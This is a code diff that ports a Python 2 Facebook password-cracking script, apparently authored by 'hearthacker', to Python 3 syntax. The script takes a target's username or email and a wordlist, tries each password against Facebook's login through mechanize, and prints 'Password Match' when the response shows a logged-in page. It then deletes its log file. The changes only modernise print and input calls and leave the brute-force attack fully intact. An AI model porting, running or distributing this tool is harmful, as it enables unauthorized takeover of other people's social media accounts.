@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-#Name:Babar Ali
-#github (https://github.com/hearthackerBabar)
-#hearthacker
+# Name: Babar Ali
+# GitHub: https://github.com/hearthackerBabar
+# Hearthacker
 
 import time
 import os
@@ -12,10 +12,10 @@ time.sleep(0.5)
 try:
     import mechanize
 except ModuleNotFoundError:
-    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
+    print('[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2')
     exit()
 os.system("clear")
-print """
+print("""
 \033[1;31m██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
 \033[1;31m██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
 \033[1;31m███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
@@ -28,22 +28,22 @@ print """
 \033[1;97m           [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;97m]
 
 \033[1;47m\033[1;35m          Enter Facebook Account User Name                 \033[1;0m
-"""    
+""")
 time.sleep(0.5)
-user = raw_input('[+] Target Username/ID/Email : ')
+user = input('[+] Target Username/ID/Email : ')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[+] Enter Wordlist Directory : ')
+wrdlstFileName = input('\n[+] Enter Wordlist Directory : ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] File Not Found!')
+    print('\n[!] File Not Found!')
     exit()
 
 time.sleep(0.8)
-print '\n\nCracking '+user+' Now...'
+print('\n\nCracking ' + user + ' Now...')
 
 time.sleep(1)
-print '\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   '
+print('\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   ')
 for password in wordlist:
     if password == '' or password == ' ':
         pass
@@ -63,20 +63,20 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '\033[1;97m[+] \033[1;31mPassword Match : '+password 
+                print('\033[1;97m[+] \033[1;31mPassword Match : ' + password)
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "\033[1;97m[+] \033[1;32mWrong Password : "+str(password)
+                print("\033[1;97m[+] \033[1;32mWrong Password : " + str(password))
         except KeyboardInterrupt:
-            print '\n#############################################\n   Exiting..'
+            print('\n#############################################\n   Exiting..')
             dos.close()
             os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
             exit()
 
 time.sleep(1)
-print 'Sorry, none of the passswords in your wordlist is right.'
+print('Sorry, none of the passwords in your wordlist is right.')
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
